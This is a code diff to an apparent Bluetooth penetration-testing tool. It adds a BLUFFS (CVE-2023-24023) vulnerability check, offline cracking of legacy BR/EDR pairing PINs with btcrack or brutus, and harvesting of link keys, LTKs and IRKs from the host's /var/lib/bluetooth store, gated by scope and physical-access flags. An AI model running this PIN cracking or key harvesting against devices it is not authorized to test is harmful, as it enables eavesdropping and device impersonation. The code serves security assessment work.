@@ -23,7 +23,7 @@ Usage:
 """
 from __future__ import annotations
 
-VERSION = "1.0.3"
+VERSION = "1.1.1"
 
 import argparse
 import json
@@ -35,6 +35,14 @@ import shutil
 import signal
 import subprocess
 import sys
+
+# 2026-06-12 cross-cutting #156: route subprocess through pr0t31n_tool_runner
+try:
+    if "/opt/pr0t31n/shared" not in sys.path:
+        sys.path.insert(0, "/opt/pr0t31n/shared")
+    import pr0t31n_tool_runner as _ur
+except ImportError:
+    _ur = None
 import threading
 import time
 import uuid
@@ -283,18 +291,27 @@ def _resolve_tool(cfg: dict, key: str) -> Optional[str]:
 
 # ── Subprocess helpers ────────────────────────────────────────────────────────
 
-def _run(cmd: list, timeout: int = 60, cwd: Optional[str] = None) -> tuple[str, int]:
-    """Run a command with timeout; return (stdout+stderr, returncode)."""
+def _run(cmd: list, timeout: int = 60, cwd: Optional[str] = None,
+         output_file: Optional[str] = None) -> tuple[str, int]:
+    """Run a command with timeout; return (stdout+stderr, returncode).
+    2026-06-12 cross-cutting #156: when pr0t31n_tool_runner is available
+    every invocation auto-emits a `.log` sibling per §14."""
     try:
-        r = subprocess.run(
-            cmd,
-            capture_output=True,
-            text=True,
-            timeout=timeout,
-            stdin=subprocess.DEVNULL,
-            cwd=cwd,
-        )
-        return r.stdout + r.stderr, r.returncode
+        if _ur is not None:
+            r = _ur.run_tool(
+                cmd, timeout=timeout, output_file=output_file,
+                cwd=cwd, tool_name=(cmd[0] if cmd else ""),
+            )
+        else:
+            r = subprocess.run(
+                cmd,
+                capture_output=True,
+                text=True,
+                timeout=timeout,
+                stdin=subprocess.DEVNULL,
+                cwd=cwd,
+            )
+        return (r.stdout or "") + (r.stderr or ""), r.returncode
     except subprocess.TimeoutExpired:
         return "(timeout)", -1
     except FileNotFoundError:
@@ -1130,11 +1147,212 @@ def _phase_key_recovery(cfg: dict, project_dir: Path) -> None:
                             )
                             break
 
+    # 2026-06-11 review round 5: BLUFFS + BR/EDR PIN crack + link-key recovery
+    try:
+        _bluffs_check(cfg, key_dir)
+    except Exception as exc:
+        _err(f"[2b] BLUFFS check error: {exc}")
+    try:
+        _brdr_pin_crack(cfg, key_dir)
+    except Exception as exc:
+        _err(f"[2c] BR/EDR PIN crack error: {exc}")
+    try:
+        _link_key_recovery(cfg, key_dir)
+    except Exception as exc:
+        _err(f"[2d] link_key_recovery error: {exc}")
+
     # Persist key recovery results
     keys_json = key_dir / "recovered_keys.json"
     keys_json.write_text(json.dumps(recovered_keys, indent=2), encoding="utf-8")
     _log(f"[2] Key recovery complete — {len(recovered_keys)} key(s) recovered")
     _status(phase_id, "complete", f"{len(recovered_keys)} key(s) recovered")
+
+
+# ── Phase 2b: BLUFFS CVE-2023-24023 detection ─────────────────────────────────
+# 2026-06-11 review round 5: BLUFFS (Bluetooth Forward and Future Secrecy
+# attack, Antonioli 2023) abuses BR/EDR Secure Connections session-key
+# derivation to force a constant low-entropy session key.  Without a
+# paired MITM rig we can't safely exploit, but we CAN flag devices that
+# support BR/EDR Secure Connections (LMP v11+ = BT 5.2+) and lack a
+# vendor-patch indicator (CVE fixed in BT Core 5.4 errata).
+
+def _bluffs_check(cfg: dict, key_dir: Path) -> None:
+    bdaddrs = cfg.get("target_bdaddrs", [])
+    if not bdaddrs:
+        return
+    sdptool = _check_tool("sdptool")
+    hcitool = _check_tool("hcitool")
+    if not (sdptool or hcitool):
+        _log("[2b] BLUFFS: sdptool/hcitool not installed — skipping")
+        return
+
+    out_dir = key_dir / "bluffs"
+    out_dir.mkdir(parents=True, exist_ok=True)
+
+    for bd in bdaddrs:
+        bd = _normalise_bdaddr(bd)
+        if not _in_scope_bdaddr(bd):
+            continue
+        info_file = out_dir / f"{bd.replace(':','')}_info.txt"
+        version_text = ""
+        if hcitool:
+            for cmd in [["hcitool", "info", bd],
+                         ["hcitool", "name", bd]]:
+                out, _ = _run(cmd, timeout=20)
+                version_text += out + "\n"
+        if sdptool:
+            out, _ = _run(["sdptool", "browse", bd], timeout=30)
+            version_text += out + "\n"
+        info_file.write_text(version_text, encoding="utf-8")
+
+        sc_supported = bool(re.search(
+            r"LMP\s*Version[^0-9]*(1[1-9]|2[0-9])|"
+            r"Bluetooth\s*5\.[2-9]|"
+            r"\b(BR/EDR.*Secure.*Connections|SSP.*Secure.*Connections)\b",
+            version_text, re.I))
+        if sc_supported:
+            _finding(
+                "bluffs_cve_2023_24023",
+                output_file=str(info_file),
+                data={"bdaddr": bd,
+                       "lmp_signals": "BR/EDR Secure Connections supported",
+                       "cve": "CVE-2023-24023",
+                       "attack": "BLUFFS — forced low-entropy session key (Antonioli 2023)",
+                       "verdict": "POTENTIALLY VULNERABLE — needs vendor-patch verification"},
+            )
+            _log(f"[2b] BLUFFS: {bd} BR/EDR SC supported — potentially CVE-2023-24023 vulnerable")
+        else:
+            _log(f"[2b] BLUFFS: {bd} no BR/EDR SC signature observed — not flagged")
+
+
+# ── Phase 2c: BR/EDR legacy PIN crack ─────────────────────────────────────────
+# 2026-06-11 review round 5: BR/EDR legacy pairing (pre-2.1 SSP) uses a
+# user-typed 4–6 digit PIN as the only entropy in Kinit/Kc derivation.
+# When we have an LMP pairing pcap (hcidump capture) we can crack it
+# offline with btcrack / brutus; if neither is installed we write a
+# deferred-cracking manifest so the operator can run it externally.
+
+def _brdr_pin_crack(cfg: dict, key_dir: Path) -> None:
+    bd_pcaps = list(key_dir.glob("**/*.pcap")) + list(key_dir.glob("**/*.pcapng"))
+    if not bd_pcaps:
+        return
+    btcrack = _check_tool("btcrack") or _check_tool("brutus")
+    tshark  = _check_tool("tshark")
+    if not tshark:
+        _log("[2c] BR/EDR PIN crack: tshark not installed — skipping pcap classification")
+        return
+    out_dir = key_dir / "brdr_pin"
+    out_dir.mkdir(parents=True, exist_ok=True)
+
+    for pcap in bd_pcaps:
+        ts_out, _ = _run([tshark, "-r", str(pcap),
+                            "-Y", "btbrlmp",
+                            "-T", "fields", "-e", "btbrlmp.opcode"],
+                          timeout=60)
+        if not ts_out.strip():
+            continue   # not a BR/EDR pairing capture
+
+        result_file = out_dir / f"{pcap.stem}_pin_crack.txt"
+        if btcrack:
+            out, rc = _run([btcrack, str(pcap)], timeout=600)
+            result_file.write_text(out, encoding="utf-8")
+            m = re.search(r"PIN\s*[:=]\s*(\d{4,6})", out)
+            if m:
+                _finding(
+                    "brdr_legacy_pin_cracked",
+                    output_file=str(result_file),
+                    data={"pcap": str(pcap), "pin": m.group(1),
+                          "method": f"{btcrack} offline crack of LMP pairing",
+                          "attack": "BR/EDR legacy SSP-pre-2.1 PIN brute-force"},
+                )
+                _log(f"[2c] BR/EDR PIN cracked from {pcap.name}: {m.group(1)}")
+            else:
+                _log(f"[2c] BR/EDR PIN crack: no PIN recovered from {pcap.name}")
+        else:
+            result_file.write_text(
+                f"# Deferred PIN crack — install btcrack or brutus\n"
+                f"pcap={pcap}\nopcodes={ts_out.strip()}\n",
+                encoding="utf-8")
+            _finding(
+                "brdr_legacy_pin_deferred",
+                output_file=str(result_file),
+                data={"pcap": str(pcap),
+                      "note": "BR/EDR LMP pairing observed; install btcrack/brutus to crack offline"},
+            )
+            _log(f"[2c] BR/EDR PIN crack deferred — btcrack/brutus not installed ({pcap.name})")
+
+
+# ── Phase 2d: link-key recovery from host store ───────────────────────────────
+# 2026-06-11 review round 5: every BR/EDR + BLE pairing the host
+# successfully completes is stored in /var/lib/bluetooth/<adapter>/<bdaddr>/info.
+# When physical_access=true the operator harvests the LinkKey / LTK / IRK
+# for offline replay, cross-device pairing inheritance, or forensic
+# chain-of-custody documentation.
+
+def _link_key_recovery(cfg: dict, key_dir: Path) -> None:
+    if not cfg.get("physical_access"):
+        _log("[2d] link_key_recovery: physical_access=false — skipping host-store harvest")
+        return
+
+    store = Path("/var/lib/bluetooth")
+    if not store.exists():
+        _log("[2d] /var/lib/bluetooth missing — skipping")
+        return
+
+    out_dir = key_dir / "link_keys"
+    out_dir.mkdir(parents=True, exist_ok=True)
+    harvested: list = []
+
+    for adapter_dir in store.iterdir():
+        if not adapter_dir.is_dir():
+            continue
+        for peer_dir in adapter_dir.iterdir():
+            if not peer_dir.is_dir():
+                continue
+            info_path = peer_dir / "info"
+            if not info_path.exists():
+                continue
+            try:
+                txt = info_path.read_text(encoding="utf-8", errors="replace")
+            except Exception:
+                continue
+
+            link_key = ""
+            ltk      = ""
+            irk      = ""
+            m = re.search(r"\[LinkKey\][\s\S]*?Key\s*=\s*([0-9A-Fa-f]+)", txt)
+            if m: link_key = m.group(1)
+            m = re.search(r"\[LongTermKey\][\s\S]*?Key\s*=\s*([0-9A-Fa-f]+)", txt)
+            if m: ltk = m.group(1)
+            m = re.search(r"\[IdentityResolvingKey\][\s\S]*?Key\s*=\s*([0-9A-Fa-f]+)", txt)
+            if m: irk = m.group(1)
+
+            peer_bd = peer_dir.name
+            adapter_bd = adapter_dir.name
+            if not _in_scope_bdaddr(peer_bd):
+                continue
+
+            if link_key or ltk or irk:
+                rec = {"adapter": adapter_bd, "peer": peer_bd,
+                        "link_key": link_key, "ltk": ltk, "irk": irk,
+                        "source": str(info_path)}
+                harvested.append(rec)
+                evidence = out_dir / f"{peer_bd.replace(':','')}.json"
+                evidence.write_text(json.dumps(rec, indent=2), encoding="utf-8")
+                _finding(
+                    "link_key_harvested",
+                    output_file=str(evidence),
+                    data=rec,
+                )
+                _log(f"[2d] Harvested link-key material from {adapter_bd} → {peer_bd}")
+
+    if harvested:
+        (out_dir / "manifest.json").write_text(
+            json.dumps(harvested, indent=2), encoding="utf-8"
+        )
+        _log(f"[2d] Total {len(harvested)} link-key record(s) harvested")
+    else:
+        _log("[2d] No in-scope link keys present in host store")
 
 
 # ── Phase 3: Exploitation ─────────────────────────────────────────────────────
